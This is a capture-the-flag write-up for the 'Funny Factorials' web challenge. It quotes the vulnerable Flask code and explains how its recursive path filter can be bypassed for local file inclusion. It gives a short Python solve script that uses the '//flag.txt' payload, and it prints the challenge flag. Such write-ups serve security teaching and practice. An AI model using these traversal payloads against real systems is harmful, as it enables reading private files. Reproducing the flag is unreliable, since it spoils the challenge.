# Funny Factorials

## Description

By `stuxf`

I made a factorials app! It's so fancy and shmancy. However factorials don't seem to properly compute at big numbers! Can you help me fix it?

[funny-factorials.amt.rs](https://funny-factorials.amt.rs/)

Downloads: [app.py](https://amateurs-prod.storage.googleapis.com/uploads/61cc4d278d720e099e8952c5ac12fce5929b4831a3b7a6e24c7ff8a20f6895ce/app.py), [Dockerfile](https://amateurs-prod.storage.googleapis.com/uploads/9b0ba53759b02a6875ce554c37b74bf3807cc93212669d5fe57b0df58e3b3f46/Dockerfile)

## Analysis

From the Dockerfile we know that flag lives in root directory. `COPY flag.txt /`

Possible attack vector: Use `theme` to get `flag.txt` with [LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion).

```py
@app.route('/')
def index():
    safe_theme = filter_path(request.args.get("theme", "themes/theme1.css"))
    f = open(safe_theme, "r")
    theme = f.read()
    f.close()
    return render_template('index.html', css=theme)
```

Vulnaribility. 
1. `/` is only removed once so `//flag.txt` -> `/flag.txt`
2. The `filter_path` uses recursion and the recursion depth is 100, which can be bypassed by sandwiching `../` inside strings. e.g.: `'....//'` -> `'../'` -> `''`.

```py
def filter_path(path):
    # print(path)
    path = path.replace("../", "")
    try:
        return filter_path(path)
    except RecursionError:
        # remove root / from path if it exists
        if path[0] == "/":
            path = path[1:]
        print(path)
        return path
	
	... 
	
    sys.setrecursionlimit(100)
```

## Solution

```py
import re
import requests

URL = 'https://funny-factorials.amt.rs/'
DATA = {'number': 3}
payload = {'theme': '//flag.txt'}
resp = requests.post(URL, data=DATA, params=payload).text
if 'amateursCTF' in resp:
    flag = re.search(r"<style>(.*)</style>", resp, re.DOTALL).group(1).strip()
    print(flag)
```

::: tip Flag
`amateursCTF{h1tt1ng_th3_r3curs10n_l1mt_1s_1mp0ssibl3}`
:::

::: info :information_source:
AttackVector 2: `../`*81 sandwiched string is required to get flag 
:::